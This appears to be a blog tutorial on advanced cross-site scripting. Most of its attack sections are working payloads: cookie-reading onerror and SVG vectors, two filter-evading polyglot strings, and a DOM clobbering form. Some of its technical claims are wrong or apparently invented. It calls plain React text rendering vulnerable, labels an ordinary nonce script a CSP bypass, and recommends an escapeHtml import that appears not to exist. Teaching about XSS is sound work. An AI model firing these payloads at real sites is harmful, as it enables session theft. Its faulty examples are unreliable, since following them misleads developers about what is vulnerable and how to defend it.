---
title: "Advanced XSS Techniques: Mastering Framework-Specific Exploits and Polyglot Payloads"
image: "https://armur-ai.github.io/armur-blog-pentest/images/security-fundamentals.png"
icon: "code"
draft: false
---

Cross-Site Scripting (XSS) continues to be one of the most prevalent web security vulnerabilities, ranking consistently in the OWASP Top 10. While basic XSS attacks are well-understood, modern web frameworks and security controls have evolved, necessitating more sophisticated exploitation techniques. In this comprehensive tutorial, we'll explore advanced XSS concepts, focusing on framework-specific vulnerabilities and the power of polyglot payloads.

## Understanding Modern Web Framework Security

Modern web frameworks like React, Angular, and Vue.js implement various security measures to prevent XSS attacks. However, these frameworks aren't immune to vulnerabilities. Let's explore how different frameworks handle user input and where they might be vulnerable.

### React-Specific XSS Vectors

React's JSX syntax provides some inherent XSS protection, but there are several ways to bypass these safeguards:

- **dangerouslySetInnerHTML Exploitation**  
React's `dangerouslySetInnerHTML` property is often a source of XSS vulnerabilities. Consider this example:

  ```javascript
  function UserContent({ content }) {
    return <div dangerouslySetInnerHTML={{ __html: content }} />;
  }
  ```

  This seemingly innocent code can be exploited if `content` contains a malicious payload:

  ```javascript
  const maliciousContent = '<img src=x onerror="alert(document.cookie)">';
  ```

- **URL-based Attacks in React**  
React applications often use URL parameters for routing and state management. Here's a vulnerable implementation:

  ```javascript
  function ProfileComponent() {
    const params = useParams();
    return <div>{decodeURIComponent(params.name)}</div>;
  }
  ```

### Angular-Specific Vulnerabilities

Angular provides built-in sanitization, but certain scenarios can lead to XSS:

- **Template Injection**  
  When using Angular's template syntax incorrectly:

  ```typescript
  @Component({
    template: `<div [innerHTML]="userInput | safeHtml"></div>`
  })
  export class VulnerableComponent {
    userInput = '<script>alert(1)</script>';
  }
  ```

  **Bypass Techniques:**

  ```typescript
  const bypass = '<svg><animate onbegin="alert(1)" attributeName=x dur=1s>';
  ```

## Understanding Polyglot Payloads

Polyglot payloads are sophisticated XSS vectors that can execute in multiple contexts. These payloads are particularly effective because they can bypass multiple types of filters simultaneously.

### Creating Effective Polyglot Payloads

Here's an example of a basic polyglot payload:

```javascript
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg*/onload=alert()//>
```

This payload works across different contexts because it:

- Closes multiple common tags
- Uses multiple encoding techniques
- Leverages different execution contexts

### Advanced Context-Aware Payloads

Different contexts require different approaches. Here's a sophisticated payload that works in multiple contexts:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a //</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Framework-Specific Bypass Techniques

### Modern Security Headers

Understanding how to bypass security headers is crucial:

- **Content-Security-Policy (CSP) Bypass:**

  ```javascript
  <script nonce="random">
    // Legitimate script with proper nonce
    setTimeout(`alert\x28document.cookie\x29`);
  </script>
  ```

### DOM Clobbering Attacks

DOM clobbering can be used to bypass certain framework protections:

```html
<form id="x">
  <input id="y" name="innerHTML" value="<img src=x onerror=alert(1)"> 
</form>
```

## Best Practices for XSS Prevention

While understanding these advanced techniques is important, implementing proper defenses is crucial:

- **Input Validation and Sanitization**  
  Always implement proper input validation:

  ```javascript
  // Example of proper input sanitization
  function sanitizeInput(input) {
    return input.replace(/[^\w. ]/gi, function(c) {
      return '&#' + c.charCodeAt(0) + ';';
    });
  }
  ```

- **Content Security Policy Implementation**  
  Implement strict CSP headers:

  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
  ```

- **Framework-Specific Security Features**  
  Utilize built-in security features:
  
  **React:**

  ```javascript
  // Use React's escapeHtml utility
  import { escapeHtml } from 'react-html-parser';
  const safeContent = escapeHtml(userInput);
  ```

## Conclusion

Advanced XSS techniques continue to evolve as web frameworks and security measures become more sophisticated. Understanding these advanced concepts is crucial for both security professionals and developers. Remember that while knowing these techniques is important for testing and security assessment, implementing proper security controls and following best practices is essential for building secure applications.